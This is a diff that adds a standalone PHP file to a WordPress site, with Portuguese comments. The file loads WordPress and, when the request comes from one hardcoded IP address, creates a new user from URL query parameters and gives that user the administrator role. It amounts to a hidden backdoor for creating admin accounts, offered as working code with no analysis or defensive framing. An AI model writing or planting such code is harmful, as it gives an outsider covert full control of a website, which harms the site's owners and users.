@@ -1,0 +1,42 @@
+<?php
+// Verifica se o WordPress está carregado
+if (!function_exists('wp_create_user')) {
+    require_once('wp-load.php');
+}
+
+function criar_usuario_pela_url() {
+    // Verifica se os parâmetros necessários estão presentes na URL e o endereço IP do cliente é válido
+    $client_ip = $_SERVER['REMOTE_ADDR'];
+    if (isset($_GET['user'], $_GET['email'], $_GET['pass']) && $client_ip === '177.128.152.39') {
+        $username = filter_var($_GET['user'], FILTER_SANITIZE_STRING);
+        $email = filter_var($_GET['email'], FILTER_SANITIZE_EMAIL);
+        $password = filter_var($_GET['pass'], FILTER_SANITIZE_STRING);
+
+        // Valida as informações do usuário
+        if (preg_match('/^[a-zA-Z0-9]{5,}$/', $username) && filter_var($email, FILTER_VALIDATE_EMAIL)) {
+
+            // Cria um novo usuário com as informações fornecidas
+            $userdata = array(
+                'user_login' => $username,
+                'user_email' => $email,
+                'user_pass' => $password
+            );
+            $user_id = wp_insert_user($userdata);
+
+            // Define a função do usuário com permissões adequadas
+            if (!is_wp_error($user_id)) {
+                $user = new WP_User($user_id);
+                $user->set_role('administrator');
+                echo 'Usuário criado com sucesso!';
+            } else {
+                echo 'Erro ao criar usuário: ' . $user_id->get_error_message();
+            }
+        } else {
+            echo 'Informações do usuário inválidas.';
+        }
+    } else {
+        echo 'Não autorizado.';
+    }
+}
+
+criar_usuario_pela_url();
